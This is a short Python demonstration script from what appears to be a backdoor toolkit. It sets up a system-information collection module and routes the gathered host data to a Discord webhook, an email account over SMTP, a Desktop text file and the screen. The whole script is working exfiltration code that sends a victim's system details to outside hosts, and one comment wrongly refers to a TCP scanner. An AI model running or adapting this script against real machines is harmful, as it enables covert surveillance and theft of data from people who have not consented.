#!/usr/bin/env python3
# https://github.com/EONRaider/bca-backdoor

__author__ = "EONRaider @ keybase.io/eonraider"

import os
import pathlib
import sys

sys.path.insert(0, str(pathlib.Path(__file__).parents[1]))

from src.modules.exfiltration import Discord, Email, File, Screen
from src.modules.exploitation import SystemInformation

import dotenv


'''This is a simple demonstration of how the SystemInformation module 
could be set up on a Linux system to perform a basic collection of 
system data and exfiltrate the results to a text file, a Discord server 
and an email address (as well as to the screen for debugging purposes).
The environment variable 'WEBHOOK_URL' must be passed if the Discord 
exfiltrator is to be used; similarly we need 'EMAIL_USERNAME' and 
'EMAIL_PASSWORD' for the Email exfiltrator.
'''

dotenv.load_dotenv()

# Set up the TCPScanner to send probes to internal and external targets
sysinfo = SystemInformation()

# Enable output of logs to STDOUT
Screen(module=sysinfo)

# A file will be written to the current user's Desktop
File(module=sysinfo,
     file_path=pathlib.Path.home().joinpath("Desktop/sample_sysinfo_log.txt"))

# Scan results will be sent to a Discord server through a Webhook URL
Discord(module=sysinfo,
        webhook_url=os.getenv("WEBHOOK_URL"))

# An email will be sent through a secure connection using SMTP
Email(module=sysinfo,
      smtp_host=os.getenv("EMAIL_HOST"),
      smtp_port=465,
      email=os.getenv("EMAIL_USERNAME"),
      password=os.getenv("EMAIL_PASSWORD"))

# Done. Perform all scans and proceed to exfiltration of data.
sysinfo.execute()
